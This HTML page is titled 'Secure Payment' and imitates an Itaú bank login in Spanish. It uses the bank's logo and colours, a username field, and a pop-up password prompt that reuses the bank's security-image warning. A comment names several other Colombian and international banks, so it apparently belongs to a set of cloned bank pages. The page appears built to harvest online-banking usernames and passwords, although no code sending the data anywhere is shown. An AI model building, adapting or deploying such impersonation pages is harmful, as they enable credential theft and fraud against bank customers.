<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="style.css">
    <title>Secure Payment</title>

     <!-- Agrega los enlaces CSS y JavaScript de Bootstrap -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
</head>
<body>


<div class="logo" style="height:300px;">
    <center><img src="/img/itaulogo.jpg" alt="" width="" height="300px"></center>
</div>
    <div style="border:1px solid #dcdcdc; height:50px; padding-bottom:18px;">
        <br>
        <center><a id="texto" style="margin-bottom:10px;">Personas</a>
          </center>
    </div>


    <div class="user">
        <br><label for="" style="margin-left:20px;">Usuario</label>
        <center><input type="text" name="Usuario" id="txtUser"></center>
        <input type="checkbox" name="" id="" style="margin-left:20px;margin-top:10px; border:1px solid black;"> <label for=""> For english</label><br>
       
        <div style="width:90%;margin:auto; font-size: 18px; margin-top:10px;">
        <label >Hemos cambiado nuestra politica de datos, para mayor información haz clic <a href="">Aquí</a></label>
        </div>


       <center> <br>
<!-- Button trigger modal -->
<button type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#exampleModal" style="width:90%; border-radius:100px; border:none; height:40px; background-color: #fe6a00;
">
Ingresar</button>
<br><br><input type="submit" value="Regístrate" style="width:88%; height:40px; background-color: white; color:#fe6a00;border:2px solid #fe6a00;
">

<br><br><a href="" style="color:blue; font-size:20px;     font-weight: 600;
">Desbloquea tu usuario</a>
        </center>
    </div>





<!-- //Banco caja social, citi bank, itau y popular -->

<!-- Modal -->
<div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      
      <div class="modal-body">
        <img src="/img/caracol.jpg" alt="" srcset="">

        <center><br><div class="gray"style="width:95%; background-color:#dcdcdc; font-size:12px;">Si en algún momento no encuentras la imagen y la frase correcta, no digites tu contraseña y llama inmediatamente a nuestra Banca Telefónica</div></center>
      </div>
      <div class="modal-footer">
       <input type="password" name="" id="" style="width:70%; height:35px;"> <button type="button" class="btn " style="border:none; background-color:#fe6a00; color:white;">Ingresar </button>
      </div>
    </div>
  </div>
</div>


</body>
</html>